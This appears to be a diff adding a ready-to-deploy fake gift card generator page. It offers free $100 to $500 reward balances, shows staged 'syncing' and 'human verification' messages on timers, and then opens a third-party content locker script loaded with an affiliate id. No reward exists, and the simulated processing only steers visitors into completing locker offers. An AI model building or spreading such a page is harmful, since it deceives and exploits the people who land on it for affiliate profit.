@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Digital Rewards Hub - Get Your Gift Cards</title>
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --bg-color: #f4f7f6;
+            --card-bg: #ffffff;
+            --primary-color: #4f46e5;
+            --primary-hover: #4338ca;
+            --text-main: #1f2937;
+            --text-muted: #6b7280;
+            --accent-green: #10b981;
+            --radius: 12px;
+            --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            align-items: center;
+            padding: 20px;
+        }
+
+        header {
+            text-align: center;
+            margin: 40px 0 20px 0;
+            max-width: 600px;
+        }
+
+        header h1 {
+            font-size: 2rem;
+            font-weight: 700;
+            color: var(--text-main);
+            margin-bottom: 10px;
+        }
+
+        header p {
+            color: var(--text-muted);
+            font-size: 1rem;
+            line-height: 1.5;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 480px;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            margin-bottom: 40px;
+        }
+
+        /* Reward Card Layout */
+        .reward-card {
+            background: var(--card-bg);
+            border-radius: var(--radius);
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: var(--shadow);
+            border: 1px solid rgba(0, 0, 0, 0.05);
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            cursor: pointer;
+        }
+
+        .reward-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
+        }
+
+        .reward-info {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .reward-icon {
+            width: 50px;
+            height: 50px;
+            background: #e0e7ff;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            color: var(--primary-color);
+            font-size: 1.2rem;
+        }
+
+        .reward-details h3 {
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin-bottom: 2px;
+        }
+
+        .reward-details p {
+            font-size: 0.85rem;
+            color: var(--accent-green);
+            font-weight: 500;
+        }
+
+        .claim-btn {
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 10px 16px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .reward-card:hover .claim-btn {
+            background-color: var(--primary-hover);
+        }
+
+        /* Overlay/Modal for Loading Sequence */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(4px);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+
+        .overlay.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #e2e8f0;
+            border-top: 5px solid var(--primary-color);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        .loading-status {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: var(--text-main);
+            text-align: center;
+            max-width: 300px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        footer {
+            margin-top: auto;
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            text-align: center;
+            padding: 20px 0;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <h1>Digital Rewards Portal</h1>
+        <p>Select an available offer below to generate your promotional reward balance. Verification required.</p>
+    </header>
+
+    <div class="container">
+        <!-- Card 1 -->
+        <div class="reward-card" onclick="startGeneration('$100 Gift Card')">
+            <div class="reward-info">
+                <div class="reward-icon">$100</div>
+                <div class="reward-details">
+                    <h3>$100 Reward Balance</h3>
+                    <p>Status: Available</p>
+                </div>
+            </div>
+            <button class="claim-btn">Claim</button>
+        </div>
+
+        <!-- Card 2 -->
+        <div class="reward-card" onclick="startGeneration('$250 Gift Card')">
+            <div class="reward-info">
+                <div class="reward-icon">$250</div>
+                <div class="reward-details">
+                    <h3>$250 Reward Balance</h3>
+                    <p>Status: Available</p>
+                </div>
+            </div>
+            <button class="claim-btn">Claim</button>
+        </div>
+
+        <!-- Card 3 -->
+        <div class="reward-card" onclick="startGeneration('$500 Gift Card')">
+            <div class="reward-info">
+                <div class="reward-icon">$500</div>
+                <div class="reward-details">
+                    <h3>$500 Reward Balance</h3>
+                    <p>Status: High Demand</p>
+                </div>
+            </div>
+            <button class="claim-btn">Claim</button>
+        </div>
+    </div>
+
+    <footer>
+        <p>&copy; 2026 Rewards Distribution Network. All rights reserved.</p>
+    </footer>
+
+    <!-- Processing Overlay -->
+    <div class="overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-status" id="statusText">Connecting to server...</div>
+    </div>
+
+    <!-- Your HubVerify Content Locker Script -->
+    <script type="text/javascript" src="https://hubverify.com/cl/clocker.php?id=6a30db5d05dfa" id="afmlock"></script>
+
+    <!-- Logic to trigger locker -->
+    <script>
+        function startGeneration(itemName) {
+            const overlay = document.getElementById('loadingOverlay');
+            const statusText = document.getElementById('statusText');
+            
+            // Show the loading screen
+            overlay.classList.add('active');
+            
+            // Phase 1: Simulate connection
+            setTimeout(() => {
+                statusText.innerText = `Syncing request for ${itemName}...`;
+            }, 1000);
+
+            // Phase 2: Simulate finalization
+            setTimeout(() => {
+                statusText.innerText = "Human Verification Required. Opening verification panel...";
+            }, 2500);
+
+            // Phase 3: Trigger HubVerify Content Locker
+            setTimeout(() => {
+                if (typeof call_locker === "function") {
+                    call_locker(); 
+                } else {
+                    // Fallback if script loads differently depending on network settings
+                    alert("Verification panel ready. Please complete the next step.");
+                }
+                // Hide overlay so locker is visible over clean background
+                overlay.classList.remove('active');
+            }, 4000);
+        }
+    </script>
+</body>
+</html>
